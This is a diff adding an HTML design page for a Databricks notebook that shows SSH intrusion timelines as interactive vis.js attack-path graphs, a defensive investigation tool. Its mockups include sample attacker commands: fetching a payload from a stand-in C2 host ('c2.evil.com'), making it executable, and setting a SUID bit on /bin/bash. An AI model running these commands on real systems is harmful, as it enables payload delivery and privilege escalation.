@@ -1,0 +1,168 @@
+<h2>Layer 3: Interactive Graph Visualization</h2>
+<p class="subtitle">A parameterized Databricks notebook that renders attack path graphs via vis.js</p>
+
+<div class="section">
+  <h3>Notebook: <code>notebooks/gold/05_investigation_graph.py</code></h3>
+  <p>Parameters via dbutils.widgets:</p>
+  <div style="padding: 16px; background: #1a1a2e; border-radius: 8px; font-family: monospace; font-size: 13px; line-height: 1.8; margin-top: 8px;">
+    <span style="color: #8be9fd;">trigger_ip</span> <span style="color: #6272a4;">— malicious IP (e.g., "185.220.101.1")</span><br>
+    <span style="color: #8be9fd;">hostname</span> <span style="color: #6272a4;">— target host (optional — auto-discovered from auth match)</span><br>
+    <span style="color: #8be9fd;">time_window_hours</span> <span style="color: #6272a4;">— how far after trigger to look (default: 24)</span><br>
+    <span style="color: #8be9fd;">catalog_name</span> <span style="color: #6272a4;">— Unity Catalog name (default: security_poc)</span>
+  </div>
+</div>
+
+<div class="section">
+  <h3>Notebook Flow</h3>
+  <div style="padding: 20px; background: #1a1a2e; border-radius: 8px; text-align: center; line-height: 2.5;">
+    <span style="display:inline-block; padding: 8px 16px; background: #44475a; border-radius: 8px; color: #f8f8f2;">Cell 1: Parameters</span>
+    <span style="color: #6272a4;"> &rarr; </span>
+    <span style="display:inline-block; padding: 8px 16px; background: #44475a; border-radius: 8px; color: #f8f8f2;">Cell 2: %run 00_timeline_common</span>
+    <span style="color: #6272a4;"> &rarr; </span>
+    <span style="display:inline-block; padding: 8px 16px; background: #44475a; border-radius: 8px; color: #f8f8f2;">Cell 3: Find trigger auth event</span>
+    <br>
+    <span style="color: #6272a4;"> &rarr; </span>
+    <span style="display:inline-block; padding: 8px 16px; background: #44475a; border-radius: 8px; color: #f8f8f2;">Cell 4: Build timeline</span>
+    <span style="color: #6272a4;"> &rarr; </span>
+    <span style="display:inline-block; padding: 8px 16px; background: #bd93f9; border-radius: 8px; color: white; font-weight: bold;">Cell 5: Derive graph nodes + edges</span>
+    <span style="color: #6272a4;"> &rarr; </span>
+    <span style="display:inline-block; padding: 8px 16px; background: #50fa7b; border-radius: 8px; color: #1a1a2e; font-weight: bold;">Cell 6: Render vis.js</span>
+  </div>
+</div>
+
+<div class="section">
+  <h3>Graph Node Types</h3>
+  <div style="display: grid; grid-template-columns: repeat(3, 1fr); gap: 12px; margin-top: 12px;">
+    <div style="padding: 16px; background: #1a1a2e; border-radius: 8px; text-align: center;">
+      <div style="width: 48px; height: 48px; background: #ff5555; border-radius: 50%; margin: 0 auto 8px; display: flex; align-items: center; justify-content: center; font-size: 20px;">IP</div>
+      <div style="color: #ff5555; font-weight: bold;">Malicious IP</div>
+      <div style="color: #6272a4; font-size: 12px; margin-top: 4px;">Red circle<br>The trigger source</div>
+    </div>
+    <div style="padding: 16px; background: #1a1a2e; border-radius: 8px; text-align: center;">
+      <div style="width: 48px; height: 48px; background: #50fa7b; border-radius: 8px; margin: 0 auto 8px; display: flex; align-items: center; justify-content: center; font-size: 20px; color: #1a1a2e;">H</div>
+      <div style="color: #50fa7b; font-weight: bold;">Host</div>
+      <div style="color: #6272a4; font-size: 12px; margin-top: 4px;">Green square<br>Target machine</div>
+    </div>
+    <div style="padding: 16px; background: #1a1a2e; border-radius: 8px; text-align: center;">
+      <div style="width: 48px; height: 48px; background: #bd93f9; border-radius: 50%; margin: 0 auto 8px; display: flex; align-items: center; justify-content: center; font-size: 20px;">U</div>
+      <div style="color: #bd93f9; font-weight: bold;">User Identity</div>
+      <div style="color: #6272a4; font-size: 12px; margin-top: 4px;">Purple circle<br>Sized by event count</div>
+    </div>
+    <div style="padding: 16px; background: #1a1a2e; border-radius: 8px; text-align: center;">
+      <div style="width: 48px; height: 48px; background: #f1fa8c; border-radius: 8px; margin: 0 auto 8px; display: flex; align-items: center; justify-content: center; font-size: 20px; color: #1a1a2e;">P</div>
+      <div style="color: #f1fa8c; font-weight: bold;">Process / Command</div>
+      <div style="color: #6272a4; font-size: 12px; margin-top: 4px;">Yellow box<br>Suspicious = larger</div>
+    </div>
+    <div style="padding: 16px; background: #1a1a2e; border-radius: 8px; text-align: center;">
+      <div style="width: 48px; height: 48px; background: #ff79c6; border-radius: 4px; margin: 0 auto 8px; display: flex; align-items: center; justify-content: center; font-size: 20px;">A</div>
+      <div style="color: #ff79c6; font-weight: bold;">Account Change</div>
+      <div style="color: #6272a4; font-size: 12px; margin-top: 4px;">Pink diamond<br>User lifecycle events</div>
+    </div>
+    <div style="padding: 16px; background: #1a1a2e; border-radius: 8px; text-align: center;">
+      <div style="width: 48px; height: 48px; background: #44475a; border-radius: 50%; margin: 0 auto 8px; display: flex; align-items: center; justify-content: center; font-size: 20px; color: #6272a4;">47</div>
+      <div style="color: #6272a4; font-weight: bold;">Collapsed Cluster</div>
+      <div style="color: #6272a4; font-size: 12px; margin-top: 4px;">Gray circle<br>Click to expand</div>
+    </div>
+  </div>
+</div>
+
+<div class="section">
+  <h3>Edge Types</h3>
+  <div style="padding: 16px; background: #1a1a2e; border-radius: 8px; font-family: monospace; font-size: 13px; line-height: 2.2;">
+    <span style="color: #ff5555;">&#9473;&#9473; <b>ssh_login</b> &#9473;&#9473;&rarr;</span> <span style="color: #6272a4;">malicious IP &rarr; host (red, thick)</span><br>
+    <span style="color: #8be9fd;">&#9473;&#9473; <b>executed</b> &#9473;&#9473;&rarr;</span> <span style="color: #6272a4;">user &rarr; process/command (blue)</span><br>
+    <span style="color: #ff79c6;">&#9473;&#9473; <b>escalated</b> &#9473;&#9473;&rarr;</span> <span style="color: #6272a4;">user &rarr; user (pink, dashed, animated)</span><br>
+    <span style="color: #f1fa8c;">&#9473;&#9473; <b>modified</b> &#9473;&#9473;&rarr;</span> <span style="color: #6272a4;">user &rarr; account (yellow)</span><br>
+    <span style="color: #44475a;">&#9473;&#9473; <b>system</b> &#9473;&#9473;&rarr;</span> <span style="color: #6272a4;">user &rarr; system event (gray, thin)</span>
+  </div>
+</div>
+
+<div class="section">
+  <h3>Progressive Disclosure (Default View vs. Expanded)</h3>
+  <div class="split">
+    <div class="mockup">
+      <div class="mockup-header">Default: Identity-Chain Focus</div>
+      <div class="mockup-body" style="padding: 20px; text-align: center; line-height: 2.8; min-height: 200px;">
+        <span style="display:inline-block; padding: 6px 14px; background: #ff5555; border-radius: 20px; color: white; font-size: 13px;">185.220.101.1</span>
+        <span style="color: #ff5555;"> &mdash;&rarr; </span>
+        <span style="display:inline-block; padding: 6px 14px; background: #50fa7b; border-radius: 6px; color: #1a1a2e; font-size: 13px;">ip-10-0-1-50</span>
+        <br>
+        <span style="display:inline-block; padding: 6px 14px; background: #bd93f9; border-radius: 20px; color: white; font-size: 13px;">ubuntu</span>
+        <span style="color: #8be9fd;"> &rarr; </span>
+        <span style="display:inline-block; padding: 5px 10px; background: #f1fa8c; border-radius: 6px; color: #1a1a2e; font-size: 12px;">curl c2.evil</span>
+        <span style="color: #8be9fd;"> &rarr; </span>
+        <span style="display:inline-block; padding: 5px 10px; background: #f1fa8c; border-radius: 6px; color: #1a1a2e; font-size: 12px;">wget mal.sh</span>
+        <br>
+        <span style="display:inline-block; padding: 6px 14px; background: #bd93f9; border-radius: 20px; color: white; font-size: 13px;">ubuntu</span>
+        <span style="color: #ff79c6;"> &#8669; sudo &#8669; </span>
+        <span style="display:inline-block; padding: 6px 14px; background: #ff79c6; border-radius: 20px; color: white; font-size: 13px;">root</span>
+        <span style="color: #8be9fd;"> &rarr; </span>
+        <span style="display:inline-block; padding: 5px 10px; background: #f1fa8c; border-radius: 6px; color: #1a1a2e; font-size: 12px;">chmod +s /bin/bash</span>
+        <br>
+        <span style="display:inline-block; padding: 6px 14px; background: #44475a; border-radius: 20px; color: #6272a4; font-size: 12px;">23 system events &middot; click to expand</span>
+      </div>
+    </div>
+    <div class="mockup">
+      <div class="mockup-header">Expanded: Full Host Scope</div>
+      <div class="mockup-body" style="padding: 20px; text-align: center; line-height: 2.8; min-height: 200px;">
+        <span style="display:inline-block; padding: 6px 14px; background: #ff5555; border-radius: 20px; color: white; font-size: 13px;">185.220.101.1</span>
+        <span style="color: #ff5555;"> &mdash;&rarr; </span>
+        <span style="display:inline-block; padding: 6px 14px; background: #50fa7b; border-radius: 6px; color: #1a1a2e; font-size: 13px;">ip-10-0-1-50</span>
+        <br>
+        <span style="display:inline-block; padding: 6px 14px; background: #bd93f9; border-radius: 20px; color: white; font-size: 13px;">ubuntu</span>
+        <span style="color: #8be9fd;"> &rarr; </span>
+        <span style="display:inline-block; padding: 5px 10px; background: #f1fa8c; border-radius: 6px; color: #1a1a2e; font-size: 12px;">curl</span>
+        <span style="color: #8be9fd;"> &rarr; </span>
+        <span style="display:inline-block; padding: 5px 10px; background: #f1fa8c; border-radius: 6px; color: #1a1a2e; font-size: 12px;">wget</span>
+        <span style="color: #ff79c6;"> &#8669; </span>
+        <span style="display:inline-block; padding: 6px 14px; background: #ff79c6; border-radius: 20px; color: white; font-size: 13px;">root</span>
+        <span style="color: #8be9fd;"> &rarr; </span>
+        <span style="display:inline-block; padding: 5px 10px; background: #f1fa8c; border-radius: 6px; color: #1a1a2e; font-size: 12px;">chmod</span>
+        <br>
+        <span style="color: #6272a4; font-size: 12px;">&#9473; background activity now visible &#9473;</span><br>
+        <span style="display:inline-block; padding: 5px 10px; background: #44475a; border-radius: 20px; color: #6272a4; font-size: 11px;">cron</span>
+        <span style="display:inline-block; padding: 5px 10px; background: #44475a; border-radius: 20px; color: #6272a4; font-size: 11px;">logrotate</span>
+        <span style="display:inline-block; padding: 5px 10px; background: #44475a; border-radius: 20px; color: #6272a4; font-size: 11px;">systemd</span>
+        <span style="display:inline-block; padding: 5px 10px; background: #44475a; border-radius: 20px; color: #6272a4; font-size: 11px;">sshd[other]</span>
+        <span style="display:inline-block; padding: 5px 10px; background: #44475a; border-radius: 20px; color: #6272a4; font-size: 11px;">auditd×15</span>
+      </div>
+    </div>
+  </div>
+</div>
+
+<div class="section">
+  <h3>Interactive Controls (rendered as HTML buttons above the graph)</h3>
+  <div style="padding: 16px; background: #1a1a2e; border-radius: 8px; display: flex; gap: 8px; flex-wrap: wrap;">
+    <span style="padding: 6px 14px; background: #50fa7b; color: #1a1a2e; border-radius: 20px; font-size: 13px; font-weight: bold;">&#10003; Auth</span>
+    <span style="padding: 6px 14px; background: #8be9fd; color: #1a1a2e; border-radius: 20px; font-size: 13px; font-weight: bold;">&#10003; Commands</span>
+    <span style="padding: 6px 14px; background: #ff79c6; color: white; border-radius: 20px; font-size: 13px; font-weight: bold;">&#10003; Account Changes</span>
+    <span style="padding: 6px 14px; background: #44475a; color: #6272a4; border-radius: 20px; font-size: 13px;">&#9744; System Events</span>
+    <span style="padding: 6px 14px; border: 1px solid #6272a4; color: #6272a4; border-radius: 20px; font-size: 13px;">Expand All</span>
+    <span style="padding: 6px 14px; border: 1px solid #6272a4; color: #6272a4; border-radius: 20px; font-size: 13px;">Reset View</span>
+  </div>
+  <p style="color: #6272a4; font-size: 13px; margin-top: 8px;">Toggle buttons filter event categories. Clicking a node shows detail panel with timestamp, raw event, and relevance score. Hover shows tooltip summary.</p>
+</div>
+
+<div class="section">
+  <h3>Node Detail Panel (on click)</h3>
+  <div style="padding: 16px; background: #1a1a2e; border-radius: 8px; font-family: monospace; font-size: 13px; line-height: 1.8;">
+    <div style="color: #bd93f9; font-weight: bold; font-size: 15px; margin-bottom: 8px;">User: ubuntu</div>
+    <div><span style="color: #8be9fd;">Events:</span> <span style="color: #f8f8f2;">12</span></div>
+    <div><span style="color: #8be9fd;">First seen:</span> <span style="color: #f8f8f2;">2026-03-24 10:01:15</span></div>
+    <div><span style="color: #8be9fd;">Last seen:</span> <span style="color: #f8f8f2;">2026-03-24 10:47:32</span></div>
+    <div><span style="color: #8be9fd;">Escalated to:</span> <span style="color: #ff79c6;">root</span></div>
+    <div><span style="color: #8be9fd;">Source IP:</span> <span style="color: #ff5555;">185.220.101.1</span></div>
+    <div style="margin-top: 8px; padding-top: 8px; border-top: 1px solid #44475a;">
+      <div style="color: #6272a4; font-size: 12px;">Connected edges (click to expand):</div>
+      <div style="color: #f8f8f2; font-size: 12px; margin-top: 4px;">
+        &rarr; curl http://c2.evil.com/payload.sh<br>
+        &rarr; wget -O /tmp/mal.sh http://...<br>
+        &rarr; chmod +x /tmp/mal.sh<br>
+        &#8669; sudo su - root<br>
+        <span style="color: #6272a4;">+ 8 more...</span>
+      </div>
+    </div>
+  </div>
+</div>
+
+<p style="margin-top: 16px; color: #8be9fd; font-style: italic;">Implementation: All rendering happens in a single displayHTML() cell. The notebook collects timeline data via PySpark, converts to JSON, injects into an HTML template containing vis.js CDN + the graph config. No additional infrastructure required.</p>
